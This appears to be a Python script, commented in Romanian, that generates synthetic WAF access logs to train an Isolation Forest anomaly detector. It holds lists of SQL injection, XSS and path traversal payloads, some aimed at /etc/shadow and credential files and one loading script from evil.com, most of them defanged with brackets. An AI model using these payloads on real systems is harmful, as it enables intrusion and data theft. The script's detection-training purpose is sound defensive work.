"""
Script de generare a setului de date sintetice pentru antrenarea modelului
Isolation Forest din pipeline-ul Fireball WAF.

Genereaza activity_logs_bun_diversified_2.csv cu:
  - 8000 randuri totale
  - ~1.6% anomalii etichetate (is_anomaly = 1)
  - Distributie diversificata de anomalii:
      * Anomalii CU PAYLOAD VIZIBIL (~60%) - SQL injection, XSS, path traversal.
        Acestea ar fi prinse si de regulile statice; functioneaza ca validare
        ca modelul invata sa marcheze ce este deja stiut ca atac.
      * Anomalii FARA PAYLOAD VIZIBIL (~40%) - comportamentale, contextuale.
        Acestea NU ar fi prinse de regulile statice. Sunt motivul pentru care
        componenta ML exista in arhitectura WAF - protectie complementara,
        nu redundanta.

Reproducibilitate: random.seed(42) pentru determinism complet.
"""

import csv
import random
import uuid
import argparse
from datetime import datetime, timedelta


#=============================================================================
#PARAMETRI GLOBALI
#=============================================================================

RANDOM_SEED = 42
TOTAL_ROWS = 8000
ANOMALY_RATIO = 0.016

#impartirea anomaliilor pe tipuri
VISIBLE_PAYLOAD_RATIO = 0.60   # 77 din 128 anomalii au payload vizibil
BEHAVIORAL_RATIO     = 0.40    # 51 din 128 sunt comportamentale

#din anomaliile cu payload vizibil, majoritatea sunt blocate (regulile prind)
#din cele comportamentale, NICIUNA nu e blocata (de aceea exista modelul ML)
BLOCKED_RATIO_AMONG_VISIBLE = 0.95  # 73 din 77 = aprox 80 blocate total

#interval temporal
START_DATETIME = datetime(2026, 5, 1, 0, 0, 1)
END_DATETIME = datetime(2026, 5, 1, 13, 30, 0)


#=============================================================================
#LISTE PREDEFINITE
#=============================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "axios/1.6.7",
    "Go-http-client/2.0",
    "PostmanRuntime/7.36.0",
]

USER_AGENT_WEIGHTS = [
    8, 5, 18, 4,
    16, 4, 4, 4, 18, 4, 18, 4, 4,
    4, 4,
    4, 4, 2,
]

#UA-uri considerate "bot/automation" - normal sa apara pe paths publice,
#suspect sa apara pe paths sensibile (auth, checkout, profile)
BOT_USER_AGENTS = {
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
}

API_CLIENT_USER_AGENTS = {
    "axios/1.6.7",
    "Go-http-client/2.0",
    "PostmanRuntime/7.36.0",
}


#paths legitime
LEGITIMATE_BASE_PATHS = [
    "/api/v1/auth/login",
    "/api/v1/dashboard/stats",
    "/api/v1/products",
    "/api/v1/users/profile",
    "/api/v1/checkout",
    "/api/v1/cart/items",
    "/api/v1/notifications",
    "/api/v1/settings",
    "/static/css/main.css",
]

#paths sensibile - aici un bot nu ar trebui sa apara
SENSITIVE_PATHS = [
    "/api/v1/auth/login",
    "/api/v1/users/profile",
    "/api/v1/checkout",
    "/api/v1/cart/items",
    "/api/v1/settings",
]

#paths publice - aici botii sunt normali
PUBLIC_PATHS = [
    "/static/css/main.css",
    "/api/v1/products",
    "/api/v1/dashboard/stats",
]


LEGITIMATE_QUERY_PARAMS = [
    ("category", ["home", "electronics", "books"]),
    ("q",        ["watch", "shoes", "headphones"]),
    ("sort",     ["price_asc", "created_desc"]),
    ("currency", ["USD"]),
    ("ref",      ["newsletter"]),
    ("utm_source", ["google"]),
    ("limit",    ["50"]),
    ("filter",   ["active"]),
]


#payload-uri cu pattern sintactic vizibil
SQLI_PAYLOADS = [
    "1 [UNION] [SELECT] null,username,password--",
    "1' OR '1'[=]'1",
    "1' OR '1'[=]'1'--",
    "admin'--",
    "admin'/*",
    "1 OR 1[=]1",
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND IF[(]1[=]1,SLEEP[(]3[)],0[)]--",
    "1' AND BENCHMARK[(]5000000,MD5[(]1[)][)]--",
    "1' AND EXTRACTVALUE[(]1,CONCAT[(]0x7e,[(][SELECT] version[(][)][)][)][)]--",
    "1 [UNION] [SELECT] user,password FROM mysql.user--",
    "-1 [UNION] [SELECT] table_name FROM information_schema.tables--",
]

XSS_PAYLOADS = [
    "[<]script[>]alert[(]1[)][<]/script[>]",
    "[<]script[>]alert[(]document.cookie[)][<]/script[>]",
    "[<]script src[=]//evil.com/x.js[>][<]/script[>]",
    "[<]img src[=]x onerror[=]alert[(]1[)][>]",
    "[<]body onload[=]alert[(]'xss'[)][>]",
    "[<]iframe src[=]javascript:alert[(]1[)][>]",
    "javascript:alert[(]1[)]",
]

PATH_TRAVERSAL_PAYLOADS = [
    "/../../../etc/passwd",
    "/../../../etc/shadow",
    "/../../../../../../etc/passwd",
    "/%2e%2e/%2e%2e/etc/passwd",
    "/..%2f..%2f..%2fetc/passwd",
    "/..%252f..%252fetc/passwd",
    "/..\\..\\..\\windows\\system32\\config\\sam",
    "/static/..%2f..%2f.env",
]

INJECTABLE_BASE_PATHS = [
    "/api/v1/products",
    "/api/v1/users/profile",
    "/api/v1/checkout",
    "/api/v1/cart/items",
    "/api/v1/auth/login",
    "/api/v1/orders",
    "/api/v1/reviews",
    "/api/v1/categories",
    "/api/v1/search",
]

INJECTABLE_PARAM_NAMES = [
    "id", "q", "search", "filter", "name", "user",
    "login", "username", "msg", "cat", "page", "ref",
]


#=============================================================================
#FUNCTII DE GENERARE - BAZA
#=============================================================================

def sanitize_ip(raw_ip: str) -> str:
    return raw_ip.replace(".", "[.]")


def random_ip() -> str:
    while True:
        octets = [random.randint(1, 254) for _ in range(4)]
        if octets[0] not in (0, 10, 127, 192, 255):
            break
    return sanitize_ip(".".join(str(o) for o in octets))


def random_timestamp() -> str:
    delta = END_DATETIME - START_DATETIME
    seconds = random.randint(0, int(delta.total_seconds()))
    ts = START_DATETIME + timedelta(seconds=seconds)
    return ts.strftime("%Y-%m-%d %H:%M:%S")


def random_user_agent() -> str:
    return random.choices(USER_AGENTS, weights=USER_AGENT_WEIGHTS, k=1)[0]


def legitimate_path() -> str:
    base = random.choice(LEGITIMATE_BASE_PATHS)
    if random.random() < 0.30:
        param_name, values = random.choice(LEGITIMATE_QUERY_PARAMS)
        value = random.choice(values)
        return f"{base}?{param_name}[=]{value}"
    return base


def legitimate_response_time() -> float:
    rt = random.lognormvariate(4.85, 0.50)
    return round(max(20.0, min(rt, 360.0)), 2)


def anomalous_response_time_payload() -> float:
    """Pentru atacuri cu payload - RT in zona inalta (procesare WAF/backend)."""
    rt = random.lognormvariate(5.55, 0.55)
    return round(max(100.0, min(rt, 700.0)), 2)


def http_method_default() -> str:
    return random.choices(["GET", "POST"], weights=[58, 42], k=1)[0]


#=============================================================================
#GENERATOR ANOMALII CU PAYLOAD VIZIBIL
#=============================================================================

def anomaly_with_visible_payload() -> dict:
    """
    Anomalie sintactica - SQL injection, XSS, path traversal.
    Aceste atacuri sunt prinse si de regulile statice ale WAF.
    Servesc ca semnal pentru modelul ML (atacuri 'cunoscute').
    """
    category = random.choices(
        ["sql_injection", "xss", "path_traversal", "mixed"],
        weights=[38, 25, 17, 20],
        k=1
    )[0]
    
    if category == "path_traversal":
        path = random.choice(PATH_TRAVERSAL_PAYLOADS)
    elif category == "sql_injection":
        base = random.choice(INJECTABLE_BASE_PATHS)
        param = random.choice(INJECTABLE_PARAM_NAMES)
        payload = random.choice(SQLI_PAYLOADS)
        path = f"{base}?{param}[=]{payload}"
    elif category == "xss":
        base = random.choice(INJECTABLE_BASE_PATHS)
        param = random.choice(INJECTABLE_PARAM_NAMES)
        payload = random.choice(XSS_PAYLOADS)
        path = f"{base}?{param}[=]{payload}"
    else:
        base = random.choice(INJECTABLE_BASE_PATHS)
        param = random.choice(["search", "username", "login"])
        payload = random.choice([
            "admin'--", "1' OR '1'[=]'1", "1 OR 1[=]1",
            "[<]img src[=]x onerror[=]alert[(]1[)][>]",
            "[<]script[>]alert[(]1[)][<]/script[>]",
        ])
        path = f"{base}?{param}[=]{payload}"
    
    return {
        "method":        http_method_default(),
        "path":          path,
        "user_agent":    random_user_agent(),
        "response_time": anomalous_response_time_payload(),
        "category":      f"payload_{category}",
    }


#=============================================================================
#GENERATOR ANOMALII FARA PAYLOAD VIZIBIL (comportamentale)
#=============================================================================

def anomaly_bot_on_sensitive_path() -> dict:
    """
    Bot legitim (Googlebot/Bingbot) accesand un path sensibil (auth/checkout/profile).
    REAL ATAC: cineva si-a setat UA-ul ca Googlebot pentru a evita filtrarea.
    INVIZIBIL pentru reguli: niciun pattern sintactic suspect in path/UA.
    Doar combinatia [UA=bot] + [path=sensibil] este anormala.
    """
    return {
        "method":        random.choice(["GET", "POST"]),
        "path":          random.choice(SENSITIVE_PATHS),
        "user_agent":    random.choice(list(BOT_USER_AGENTS)),
        "response_time": round(random.lognormvariate(4.85, 0.50), 2),  # RT normal
        "category":      "behavioral_bot_on_sensitive",
    }


def anomaly_unusual_method_on_static() -> dict:
    """
    Metoda HTTP neobisnuita pe resursa publica read-only.
    DELETE/PUT pe /static/css/main.css - nicio aplicatie reala nu face asta.
    INVIZIBIL pentru reguli: path-ul si headerele par normale.
    Doar metoda HTTP raportata la resursa este anormala.
    """
    return {
        "method":        random.choice(["DELETE", "PUT", "PATCH"]),
        "path":          random.choice(PUBLIC_PATHS),
        "user_agent":    random_user_agent(),
        "response_time": round(random.lognormvariate(4.85, 0.50), 2),
        "category":      "behavioral_unusual_method",
    }


def anomaly_long_response_time() -> dict:
    """
    Cerere normala dar cu RT extrem de mare (>1500ms) pe path simplu.
    Poate indica: scanare lenta cu blind SQL injection (timing attack fara
    keywords vizibile), backend stresat de atac, exfiltrare lenta de date.
    INVIZIBIL pentru reguli: nicio sintaxa suspecta in cerere.
    Doar timpul de procesare este iesit din distributie.
    """
    return {
        "method":        "GET",
        "path":          random.choice(LEGITIMATE_BASE_PATHS),
        "user_agent":    random_user_agent(),
        "response_time": round(random.uniform(1500, 5000), 2),  # outlier extrem
        "category":      "behavioral_extreme_rt",
    }


def anomaly_long_url() -> dict:
    """
    URL extrem de lung pe path legitim, fara payload sintactic.
    Poate indica fuzzing, buffer overflow attempt, sau parameter pollution.
    INVIZIBIL pentru reguli: nicio sintaxa suspecta in URL.
    Doar lungimea totala (>250 caractere) este anormala.
    Modelul prinde prin feature 'url_length' care e in pipeline.
    """
    base = random.choice(LEGITIMATE_BASE_PATHS)
    #generez parametri lungi cu valori plauzibile dar concatenate
    long_value = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=200))
    path = f"{base}?session[=]{long_value}"
    return {
        "method":        random.choice(["GET", "POST"]),
        "path":          path,
        "user_agent":    random_user_agent(),
        "response_time": round(random.lognormvariate(5.0, 0.4), 2),
        "category":      "behavioral_long_url",
    }


def anomaly_api_client_on_browser_path() -> dict:
    """
    Client de tip axios/Go/Postman pe path-uri specifice browser-ului
    (cum ar fi /static/css/main.css). API clients nu cer resurse statice
    CSS in flow normal - ar fi browseri.
    INVIZIBIL pentru reguli: UA si path sunt ambele plauzibile.
    Doar combinatia este anormala.
    """
    return {
        "method":        "GET",
        "path":          "/static/css/main.css",
        "user_agent":    random.choice(list(API_CLIENT_USER_AGENTS)),
        "response_time": round(random.lognormvariate(4.85, 0.50), 2),
        "category":      "behavioral_api_client_on_static",
    }


def anomaly_rare_path_pattern() -> dict:
    """
    Path care arata legitim ca structura dar nu apare niciodata in trafic normal.
    De exemplu, /api/v1/internal/debug, /api/v1/admin/config.
    INVIZIBIL pentru reguli: structura asemanatoare cu paths legitime,
    fara keywords suspect.
    Modelul prinde prin feature 'url_freq' (frecventa scazuta in train set).
    """
    rare_paths = [
        "/api/v1/internal/debug",
        "/api/v1/admin/config",
        "/api/v1/internal/healthcheck",
        "/api/v1/admin/users",
        "/api/v1/internal/metrics",
        "/api/v1/backup/download",
        "/api/v1/admin/logs",
        "/api/v2/users",  # versiune neexistenta
        "/api/internal",
        "/.git/config",
        "/api/v1/private/keys",
    ]
    return {
        "method":        random.choice(["GET", "POST"]),
        "path":          random.choice(rare_paths),
        "user_agent":    random_user_agent(),
        "response_time": round(random.lognormvariate(4.85, 0.50), 2),
        "category":      "behavioral_rare_path",
    }


def anomaly_behavioral() -> dict:
    """
    Selecteaza un tip de anomalie comportamentala (fara payload vizibil).
    Distributie reflectand realismul: scanari/probe automate sunt mai
    frecvente decat atacuri sofisticate de tip timing.
    """
    generator = random.choices(
        [
            anomaly_bot_on_sensitive_path,      # 25% - UA spoofing
            anomaly_unusual_method_on_static,   # 15% - metoda anormala
            anomaly_long_response_time,         # 10% - timing attack
            anomaly_long_url,                   # 20% - fuzzing/buffer
            anomaly_api_client_on_browser_path, # 15% - context UA-path
            anomaly_rare_path_pattern,          # 15% - reconaissance
        ],
        weights=[25, 15, 10, 20, 15, 15],
        k=1
    )[0]
    return generator()


#=============================================================================
#PIPELINE PRINCIPAL
#=============================================================================

def generate_dataset(output_path: str):
    random.seed(RANDOM_SEED)
    
    print(f"[gen] Seed: {RANDOM_SEED}, total: {TOTAL_ROWS}")
    
    n_anomalies = int(TOTAL_ROWS * ANOMALY_RATIO)
    n_visible = int(n_anomalies * VISIBLE_PAYLOAD_RATIO)
    n_behavioral = n_anomalies - n_visible
    n_blocked_visible = int(n_visible * BLOCKED_RATIO_AMONG_VISIBLE)
    
    print(f"[gen] Anomalii totale: {n_anomalies}")
    print(f"[gen]   - cu payload vizibil (prinse de reguli): {n_visible}")
    print(f"[gen]       * blocate: {n_blocked_visible}")
    print(f"[gen]       * trecute (ALLOW): {n_visible - n_blocked_visible}")
    print(f"[gen]   - comportamentale (invizibile pt reguli): {n_behavioral}")
    print(f"[gen]       * toate ALLOW (de aceea exista ML-ul)")
    
    #indici aleatori
    all_anomaly_indices = random.sample(range(TOTAL_ROWS), n_anomalies)
    visible_indices = set(all_anomaly_indices[:n_visible])
    behavioral_indices = set(all_anomaly_indices[n_visible:])
    blocked_visible_indices = set(random.sample(
        sorted(visible_indices), n_blocked_visible
    ))
    
    rows = []
    for i in range(TOTAL_ROWS):
        record_id = str(uuid.UUID(int=random.getrandbits(128)))
        timestamp = random_timestamp()
        ip = random_ip()
        
        if i in visible_indices:
            # anomalie cu payload vizibil
            data = anomaly_with_visible_payload()
            action = "BLOCK" if i in blocked_visible_indices else "ALLOW"
            is_anomaly = 1
        elif i in behavioral_indices:
            # anomalie comportamentala - ALLOW (regulile nu o prind)
            data = anomaly_behavioral()
            action = "ALLOW"
            is_anomaly = 1
        else:
            # cerere legitima
            data = {
                "method":        http_method_default(),
                "path":          legitimate_path(),
                "user_agent":    random_user_agent(),
                "response_time": legitimate_response_time(),
            }
            action = "ALLOW"
            is_anomaly = 0
        
        rows.append({
            "record_id":  record_id,
            "timestamp":  timestamp,
            "client_ip":  ip,
            "field_a":    data["method"],
            "field_b":    data["path"],
            "field_c":    action,
            "field_d":    data["user_agent"],
            "field_e":    data["response_time"],
            "field_f":    "",
            "is_anomaly": is_anomaly,
        })
    
    rows.sort(key=lambda r: r["timestamp"])
    
    fieldnames = [
        "record_id", "timestamp", "client_ip",
        "field_a", "field_b", "field_c", "field_d",
        "field_e", "field_f", "is_anomaly",
    ]
    
    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)
    
    print(f"\n[gen] Salvat: {output_path} ({len(rows)} randuri)")
    
    #verificare
    n_anom = sum(1 for r in rows if r["is_anomaly"] == 1)
    n_block = sum(1 for r in rows if r["field_c"] == "BLOCK")
    n_allow_anom = sum(1 for r in rows if r["is_anomaly"]==1 and r["field_c"]=="ALLOW")
    print(f"[gen] Verificare:")
    print(f"[gen]   - is_anomaly=1: {n_anom} ({n_anom/len(rows)*100:.2f}%)")
    print(f"[gen]   - field_c=BLOCK: {n_block}")
    print(f"[gen]   - anomalii ALLOW (au trecut filtrul WAF): {n_allow_anom}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Generator dataset sintetic pentru Fireball WAF ML pipeline"
    )
    parser.add_argument(
        "output",
        nargs="?",
        default="activity_logs_bun_diversified_3.csv",
        help="Path output (default: ./activity_logs_bun_diversified_2.csv)"
    )
    args = parser.parse_args()
    generate_dataset(args.output)